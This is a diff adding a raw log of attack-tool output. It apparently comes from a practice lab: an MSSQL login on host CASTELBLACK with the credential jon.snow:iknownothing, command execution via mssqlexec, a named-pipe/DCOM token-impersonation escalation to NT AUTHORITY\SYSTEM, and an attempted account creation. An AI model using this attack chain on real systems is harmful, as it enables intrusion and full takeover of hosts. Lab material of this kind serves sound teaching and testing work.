@@ -1,0 +1,30 @@
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (EncryptionReq:False) 
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing (Pwn3d!)
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [+] Executed command via mssqlexec
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] CombaseModule: 0x140723728941056
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DispatchTable: 0x140723731254464
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] UseProtseqFunction: 0x140723730632480
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] UseProtseqFunctionParamCount: 6
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] HookRPC
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Start PipeServer
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Trigger RPCSS
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] CreateNamedPipe \\.\pipe\f99ad5e1-7d94-4293-9e61-35987ba90bf1\pipe\epmapper
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj IPID: 0000ac02-04b8-ffff-5982-46da1083e596
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj OXID: 0xc6ff4d2c05885914
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj OID: 0xb5439205c38f76b1
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj Flags: 0x281
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] DCOM obj PublicRefs: 0x0
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Marshal Object bytes len: 100
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] UnMarshal Object
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Pipe Connected!
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] CurrentsImpersonationLevel: Impersonation
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Start Search System Token
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] PID : 864 Token:0x676  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Find System Token : True
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] UnmarshalObject: 0x80070776
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] CurrentUser: NT AUTHORITY\SYSTEM
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] process start with pid 2776
+MSSQL                    192.168.56.22   1433   CASTELBLACK      The account already exists.
+MSSQL                    192.168.56.22   1433   CASTELBLACK      More help is available by typing NET HELPMSG 2224.
